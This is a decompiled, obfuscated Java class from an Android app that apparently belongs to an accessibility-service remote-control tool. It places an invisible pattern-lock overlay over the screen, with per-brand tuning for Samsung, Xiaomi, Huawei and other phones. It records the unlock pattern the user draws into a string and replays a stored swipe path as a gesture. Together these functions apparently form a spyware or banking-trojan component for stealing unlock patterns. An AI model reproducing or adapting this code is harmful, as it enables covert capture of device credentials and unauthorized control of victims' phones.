package defpackage;

import android.accessibilityservice.GestureDescription;
import android.graphics.Path;
import android.graphics.Rect;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.text.TextUtils;
import android.view.View;
import android.view.WindowManager;
import androidx.work.impl.Scheduler;
import com.mamimobi.AccessService;
import com.mamimobi.videostream.model.ScreenPoints;
import com.mamimobi.videostream.view.PatternLockView;
import java.lang.ref.WeakReference;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.Timer;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicLong;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;
import org.json.JSONArray;

/* JADX INFO: loaded from: classes.dex */
public abstract class pk0 {
    public static WindowManager a;
    public static WeakReference b;
    public static final p50 c = new p50(29);
    public static final ReentrantLock d = new ReentrantLock();
    public static final ReentrantLock e = new ReentrantLock();
    public static final AtomicReference f = new AtomicReference();
    public static final AtomicLong g = new AtomicLong(0);
    public static final AtomicBoolean h = new AtomicBoolean(false);
    public static Timer i = new Timer();

    public static void a(ArrayList arrayList) {
        if (arrayList.size() < 4) {
            AccessService.n0.set(false);
            return;
        }
        try {
            StringBuilder sb = new StringBuilder();
            Iterator it = arrayList.iterator();
            while (it.hasNext()) {
                sb.append(((qk0) it.next()).c);
                sb.append(",");
            }
            AccessService.f0 = sb.toString();
        } catch (Exception e2) {
            e2.printStackTrace();
        }
        try {
            AccessService.e0.performGlobalAction(2);
            String strQ0 = fa0.q0(AccessService.e0, "PATH", "");
            if (TextUtils.isEmpty(strQ0) || strQ0.equals("[]")) {
                return;
            }
            JSONArray jSONArray = new JSONArray(strQ0);
            Path path = new Path();
            for (int i2 = 0; i2 < jSONArray.length(); i2++) {
                ScreenPoints screenPoints = (ScreenPoints) AccessService.h0.b(ScreenPoints.class, jSONArray.getString(i2));
                if ("d".equals(screenPoints.action)) {
                    path.moveTo(screenPoints.x, screenPoints.y);
                } else {
                    path.lineTo(screenPoints.x, screenPoints.y);
                }
            }
            WeakReference weakReference = b;
            if ((weakReference == null || weakReference.get() == null) ? false : true) {
                e();
            }
            GestureDescription gestureDescriptionBuild = new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 0L, 350L)).build();
            AccessService.e0.dispatchGesture(gestureDescriptionBuild, null, null);
            new Handler(Looper.getMainLooper()).postDelayed(new e(23, gestureDescriptionBuild), 1000L);
        } catch (Exception e3) {
            AccessService.n0.set(false);
            e3.printStackTrace();
        }
    }

    public static void b(WindowManager.LayoutParams layoutParams, Rect rect) {
        layoutParams.gravity = 8388659;
        layoutParams.x = rect.left;
        layoutParams.y = rect.top;
        layoutParams.width = rect.width();
        layoutParams.height = rect.height();
    }

    public static void c(Rect rect, PatternLockView patternLockView) {
        patternLockView.setAspectRatioEnabled(true);
        patternLockView.setInputEnabled(true);
        patternLockView.setDotCount(3);
        String str = Build.BRAND;
        if (str.equalsIgnoreCase("samsung")) {
            patternLockView.setNormalColor(0);
            patternLockView.setNormalDotSize(20);
            patternLockView.setSelectedDotSize(40);
            patternLockView.setPathWidth(10);
            patternLockView.setCorrectColor(0);
            patternLockView.setPathColor(0);
            if (rect.height() != 0) {
                patternLockView.setAspectRatio((rect.width() * 1.0f) / rect.height());
            } else {
                patternLockView.setAspectRatio(0.0f);
            }
            patternLockView.setDotVerticalAlign(PatternLockView.DotVerticalAlign.ALIGN_CENTER);
            patternLockView.setDotAnimationDuration(100);
            patternLockView.setPathEndAnimationDuration(Scheduler.MAX_GREEDY_SCHEDULER_LIMIT);
            return;
        }
        if (str.equalsIgnoreCase("huawei") || str.equalsIgnoreCase("honor")) {
            patternLockView.setNormalColor(0);
            patternLockView.setNormalDotSize(20);
            patternLockView.setSelectedDotSize(40);
            patternLockView.setPathWidth(10);
            patternLockView.setCorrectColor(0);
            patternLockView.setPathColor(0);
            if (rect.height() != 0) {
                patternLockView.setAspectRatio((rect.width() * 1.0f) / rect.height());
            } else {
                patternLockView.setAspectRatio(0.0f);
            }
            patternLockView.setDotVerticalAlign(PatternLockView.DotVerticalAlign.ALIGN_CENTER);
            patternLockView.setDotAnimationDuration(150);
            patternLockView.setPathEndAnimationDuration(100);
            return;
        }
        if (str.equalsIgnoreCase("xiaomi") || str.equalsIgnoreCase("redmi") || str.equalsIgnoreCase("poco") || str.equalsIgnoreCase("blackshark")) {
            patternLockView.setNormalColor(0);
            patternLockView.setNormalDotSize(8);
            patternLockView.setSelectedDotSize(20);
            patternLockView.setPathWidth(5);
            patternLockView.setCorrectColor(0);
            patternLockView.setPathColor(0);
            if (rect.height() != 0) {
                patternLockView.setAspectRatio((rect.width() * 1.0f) / rect.height());
            } else {
                patternLockView.setAspectRatio(0.0f);
            }
            patternLockView.setDotVerticalAlign(PatternLockView.DotVerticalAlign.ALIGN_CENTER);
            patternLockView.setDotAnimationDuration(150);
            patternLockView.setPathEndAnimationDuration(100);
            return;
        }
        if (str.equalsIgnoreCase("vivo") || str.equalsIgnoreCase("iqoo")) {
            patternLockView.setNormalColor(0);
            patternLockView.setNormalDotSize(20);
            patternLockView.setSelectedDotSize(40);
            patternLockView.setPathWidth(10);
            patternLockView.setCorrectColor(0);
            patternLockView.setPathColor(0);
            if (rect.height() != 0) {
                patternLockView.setAspectRatio((rect.width() * 1.0f) / rect.height());
            } else {
                patternLockView.setAspectRatio(0.0f);
            }
            patternLockView.setNormalDotSize(20);
            patternLockView.setDotVerticalAlign(PatternLockView.DotVerticalAlign.ALIGN_CENTER);
            patternLockView.setDotAnimationDuration(150);
            patternLockView.setPathEndAnimationDuration(100);
            return;
        }
        if (str.equalsIgnoreCase("oppo") || str.equalsIgnoreCase("realme") || str.equalsIgnoreCase("oneplus")) {
            patternLockView.setNormalColor(0);
            patternLockView.setNormalDotSize(20);
            patternLockView.setSelectedDotSize(40);
            patternLockView.setPathWidth(10);
            patternLockView.setCorrectColor(0);
            patternLockView.setPathColor(0);
            if (rect.height() != 0) {
                patternLockView.setAspectRatio((rect.width() * 1.0f) / rect.height());
            } else {
                patternLockView.setAspectRatio(0.0f);
            }
            patternLockView.setDotAnimationDuration(150);
            patternLockView.setPathEndAnimationDuration(100);
            patternLockView.setDotVerticalAlign(PatternLockView.DotVerticalAlign.ALIGN_CENTER);
            return;
        }
        if (str.equalsIgnoreCase("tecno") || str.equalsIgnoreCase("itel") || str.equalsIgnoreCase("infinix")) {
            patternLockView.setNormalColor(0);
            patternLockView.setNormalDotSize(20);
            patternLockView.setSelectedDotSize(40);
            patternLockView.setCorrectColor(0);
            patternLockView.setPathWidth(10);
            patternLockView.setPathColor(0);
            if (rect.height() != 0) {
                patternLockView.setAspectRatio((rect.width() * 1.0f) / rect.height());
            } else {
                patternLockView.setAspectRatio(0.0f);
            }
            patternLockView.setDotAnimationDuration(50);
            patternLockView.setPathEndAnimationDuration(50);
            patternLockView.setDotVerticalAlign(PatternLockView.DotVerticalAlign.ALIGN_CENTER);
            return;
        }
        if (str.equalsIgnoreCase("tecno") || str.equalsIgnoreCase("itel") || str.equalsIgnoreCase("infinix")) {
            patternLockView.setNormalColor(0);
            patternLockView.setNormalDotSize(20);
            patternLockView.setSelectedDotSize(40);
            patternLockView.setCorrectColor(0);
            patternLockView.setPathWidth(10);
            patternLockView.setPathColor(0);
            if (rect.height() != 0) {
                patternLockView.setAspectRatio((rect.width() * 1.0f) / rect.height());
            } else {
                patternLockView.setAspectRatio(0.0f);
            }
            patternLockView.setDotAnimationDuration(50);
            patternLockView.setPathEndAnimationDuration(50);
            patternLockView.setDotVerticalAlign(PatternLockView.DotVerticalAlign.ALIGN_CENTER);
            return;
        }
        String property = "";
        try {
            property = Build.VERSION.SDK_INT >= 26 ? System.getProperty("config_os_brand", "") : (String) Class.forName("android.os.SystemProperties").getMethod("get", String.class).invoke(null, "config_os_brand");
        } catch (Exception unused) {
        }
        if (property != null) {
            try {
                if (property.toLowerCase().contains("harmony")) {
                    patternLockView.setNormalColor(0);
                    patternLockView.setNormalDotSize(20);
                    patternLockView.setSelectedDotSize(40);
                    patternLockView.setCorrectColor(0);
                    patternLockView.setPathWidth(10);
                    patternLockView.setPathColor(0);
                    if (rect.height() != 0) {
                        patternLockView.setAspectRatio((rect.width() * 1.0f) / rect.height());
                    } else {
                        patternLockView.setAspectRatio(0.0f);
                    }
                    patternLockView.setDotVerticalAlign(PatternLockView.DotVerticalAlign.ALIGN_CENTER);
                    patternLockView.setDotAnimationDuration(150);
                    patternLockView.setPathEndAnimationDuration(100);
                    return;
                }
            } catch (Exception e2) {
                s90.J("检查HarmonyOS失败", e2);
            }
        }
        patternLockView.setNormalColor(0);
        patternLockView.setNormalDotSize(20);
        patternLockView.setSelectedDotSize(40);
        patternLockView.setPathWidth(10);
        patternLockView.setCorrectColor(0);
        patternLockView.setPathColor(0);
        if (rect.height() != 0) {
            patternLockView.setAspectRatio((rect.width() * 1.0f) / rect.height());
        } else {
            patternLockView.setAspectRatio(0.0f);
        }
        patternLockView.setDotVerticalAlign(PatternLockView.DotVerticalAlign.ALIGN_CENTER);
        patternLockView.setDotAnimationDuration(50);
        patternLockView.setPathEndAnimationDuration(50);
    }

    public static int d(Rect rect) {
        ReentrantLock reentrantLock = e;
        try {
            if (!reentrantLock.tryLock()) {
                return 0;
            }
            AccessService accessService = AccessService.e0;
            if (accessService != null && a == null) {
                a = (WindowManager) accessService.getSystemService("window");
            }
            WeakReference weakReference = b;
            if ((weakReference == null || weakReference.get() == null) ? false : true) {
                return 1;
            }
            ((LinkedList) c.F).clear();
            PatternLockView patternLockView = new PatternLockView(AccessService.e0);
            b = new WeakReference(patternLockView);
            WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams();
            layoutParams.flags = 65834;
            layoutParams.format = -3;
            layoutParams.alpha = 1.0f;
            layoutParams.dimAmount = 0.05f;
            layoutParams.type = 2032;
            b(layoutParams, rect);
            c(rect, patternLockView);
            patternLockView.setSystemUiVisibility(4);
            patternLockView.setImportantForAccessibility(2);
            if (Build.VERSION.SDK_INT >= 30) {
                patternLockView.setImportantForContentCapture(2);
            }
            nk0 nk0Var = new nk0(patternLockView);
            CopyOnWriteArrayList copyOnWriteArrayList = patternLockView.V;
            if (!copyOnWriteArrayList.contains(nk0Var)) {
                copyOnWriteArrayList.add(nk0Var);
            }
            CountDownLatch countDownLatch = new CountDownLatch(1);
            patternLockView.getViewTreeObserver().addOnWindowAttachListener(new ok0(countDownLatch));
            a.addView(patternLockView, layoutParams);
            try {
                countDownLatch.await(500L, TimeUnit.MILLISECONDS);
            } catch (InterruptedException unused) {
                Thread.currentThread().interrupt();
            }
            return 1;
        } catch (Exception e2) {
            s90.J("PatternLockHelper", e2);
            return 0;
        } finally {
            reentrantLock.unlock();
        }
    }

    public static void e() {
        try {
            WeakReference weakReference = b;
            if (weakReference != null && weakReference.get() != null) {
                if (a != null && h.get()) {
                    a.removeViewImmediate((View) b.get());
                }
                ((PatternLockView) b.get()).b();
            }
            f.set(null);
            b = null;
            Timer timer = i;
            if (timer != null) {
                timer.cancel();
                i = null;
            }
        } catch (Exception e2) {
            s90.J("PatternLockHelper", e2);
        }
    }
}
